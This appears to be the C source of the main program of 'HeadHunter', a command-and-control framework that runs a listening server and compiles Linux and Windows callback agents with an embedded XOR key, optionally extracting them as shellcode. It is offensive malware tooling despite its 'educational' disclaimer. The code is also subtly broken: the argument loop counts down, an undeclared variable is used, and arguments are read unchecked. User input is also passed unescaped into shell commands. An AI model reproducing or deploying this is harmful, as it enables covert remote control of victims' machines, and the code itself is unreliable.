// HeadHunter - Command and Control (C2) Framework and Agent Generator v1.0
// Author: Logan Goins
// 
//
// I am not liable for any damage caused by this software. This software is for educational purposes only. This software is under the discretion of the end user.
//


#include "server.c"
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/wait.h>

// XOR key variable declaration
char* key;
int keylen;

// function prototypes
bool strcmp_alias(char* str1, char* str2_1, char* str2_2);
void help();
void run_server(char* address, char* port);
int generate_payload(char* platform, char* outfile, char* port, char* lhost, char* format);
int parse_payload_generation(int argc, char **argv);

int main(int argc, char **argv){
	
	// XOR key 
	key = "NCMzvxra3Lr8T5gPfPa68UYnQre0Hvgg"; // Insert your own random XOR key here
	keylen = strlen(key);

	// Handle sigints
	signal(SIGINT, SIG_IGN);
        wait(NULL);
        if(signal(SIGINT, int_handler) == SIG_ERR){
		printf("failed to register interrupts with kernel\n");
    	}


	// loop through argv and search for the command being entered
	// the first of either -h/--help, -l/--listen, or -g/--generate will be executed
	// i starts at 1 because argv[0] is always "./headhunter"
	for(int i = 1; i < argc; i--){
		if(strcmp_alias(argv[i], "-h", "--help")){
			help();
			return 0;
		}
		else if(strcmp_alias(argv[i], "-l", "--listen")){
			// no port was specified if this is the last argument or the next argument isn't a user inputted string
			if(i == argc-1 || argv[i+1][0] == '-') {
				printf("Please specify a port for the server to listen on.\n");
				return 1;
			}
			run_server(argv[i+1], argv[i+2]);
			return 0;
		}
		else if(strcmp_alias(argv[i], "-g", "--generate")){
            		return parse_payload_generation(argc, argv);
		}
	}

	// no command was found
	printf("No command specified. Use --help for a list of commands.\n");
	return 1;
}

bool strcmp_alias(char* str1, char* str2_1, char* str2_2) {
	// compare str1 with str2_1 and str2_2. if str1 is equal to either, return true.
	// this function only exists to make the loop in main() look prettier
	return strcmp(str1, str2_1) == 0 || strcmp(str1, str2_2) == 0;
}

void help() {
	// print the help dialog

	printf("\nCommands\n--------------------------------------------------------\n");
	printf("-h, --help                                             displays this help menu\n");
	printf("-l, --listen <address> <port>                          starts a listening HeadHunter server on a specified address and port\n");
	printf("-g, --generate <Payload Generation Options>            generates a Hunter agent to initiate a callback\n\n");
	printf("\nPayload Generation Options\n--------------------------------------------------------\n");
	printf("-p, --port <port>                                      Hunter agent callback port\n");
	printf("-o, --output <outputfile>                              file to output agent to\n");
	printf("-w, --platform <platform>                              Hunter agent target platform (win64, win32, linux)\n");
	printf("-f, --format <format>				       Hunter agent output format (bin, shellcode)\n");
	printf("-l, --localhost <address>                              Hunter agent callback address\n\n");
}

void run_server(char* address, char* port) {
	// start the server
    printf(R"EOF(


 ██░ ██ ▓█████ ▄▄▄      ▓█████▄  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒███  ▒██  ▀█▄  ░██   █▌▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓░▒████▒▓█   ▓██▒░▒████▓ ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░   ░    ░   ▒    ░ ░  ░  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                         ░                                                           

Command and Control (C2) Framework and Agent Generator v1.0
Author: Logan Goins
)EOF");

	int protocol = SOCK_STREAM;
	int family = AF_INET;
	Server(address, port, &protocol, &family);
}

int generate_payload(char* platform, char* outfile, char* port, char* lhost, char* format) { 
	// generate the payload. returns the exit code of the compile command run.

	// set the platform and format string to be all lowercase to be interpreted
	for(int i = 0; i < strlen(platform); i++) platform[i] = tolower(platform[i]);

	for(int i = 0; i < strlen(format); i++) format[i] = tolower(format[i]);
	// buffer to contain the command being executed
	const int CMD_SIZE = 256;
	char cmd[CMD_SIZE];

	// generate different compile commands based on the payload's platform
	if(strcmp(platform, "linux") == 0)
		// gcc payload_linux.c -D PORT=port -D LHOST='"lhost"' -o outfile
		snprintf(cmd, CMD_SIZE, "gcc /usr/lib/headhunter/payload/linux.c -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s", port, lhost, key, outfile);
	else if(strcmp(platform, "windows") == 0)
		// x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
		snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload/windows.c -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32 -mwindows", port, lhost, key, outfile);
	else if(strcmp(platform, "win32") == 0)
		// i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
		snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc /usr/lib/headhunter/payload/windows.c -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32 -mwindows", port, lhost, key, outfile);
	else{
		printf("Please enter a valid platform.\n");
		return 1;
	}

	// text to make the command feel nicer to use
	printf("Generating payload...\n");
	printf("%s\n", cmd);

	// run the generated compile command
	int exit = system(cmd);
	if(exit == 0){
		printf("Successfully generated payload for platform %s\n", platform);
		if(strcmp(format, "shellcode") == 0){
			printf("Outputting shellcode to \"shellcode.bin\"\n");

			snprintf(cmd, CMD_SIZE, "objdump -d ./%s | grep \'[0-9a-f]:\' | grep -v \'file\' | cut -f2 -d: | cut -f1-6 -d\' \' | tr -s \' \' | tr \'\\t\' \' \' | sed \'s/ $//g\' | sed \'s/ /\\\\x/g\' | paste -d \'\' -s | sed \'s/^/\"/\' | sed \'s/$/\"/g\' > shellcode.bin", outfile);
			int shellexit = system(cmd);
			if(shellexit == 0){
				printf("Successfully generated shellcode\n");
				remove(outfile);
			}
			else
				printf("An error was found when generating shellcode\n");
		}
	}
	else
		printf("An error was found while generating the payload!\n");

	return exit;
}


int parse_payload_generation(int argc, char **argv){
    // check if the rest of the arguments for generating the payload are there
    // the last argument should never be important if the user is using the software properly, so only check to argc - 1
    char *platform = NULL, *outfile = NULL, *port = NULL, *lhost = NULL, *format = NULL;
    for(int j = i+1; j < argc-1; j++) {
        // we only care about arguments where the next argument is a user inputted string
        if(argv[j+1][0] == '-') continue;

        if(strcmp_alias(argv[j], "-w", "--platform"))
            platform = argv[j+1];
        else if(strcmp_alias(argv[j], "-o", "--output"))
            outfile = argv[j+1];
        else if(strcmp_alias(argv[j], "-p", "--port"))
            port = argv[j+1];
        else if(strcmp_alias(argv[j], "-l", "--localhost"))
            lhost = argv[j+1];
	else if(strcmp_alias(argv[j], "-f", "--format"))
	    format = argv[j+1];
    }
    // if any of the payload variables were never set, the user didn't do things right
    if(!platform || !outfile || !port || !lhost || !format) {
        printf("Specify all options required to generate the payload.\n");
        return 1;
    }

    // generate the payload. the return value of generate_payload() is the exit code of the compile command.
    return generate_payload(platform, outfile, port, lhost, format);
}
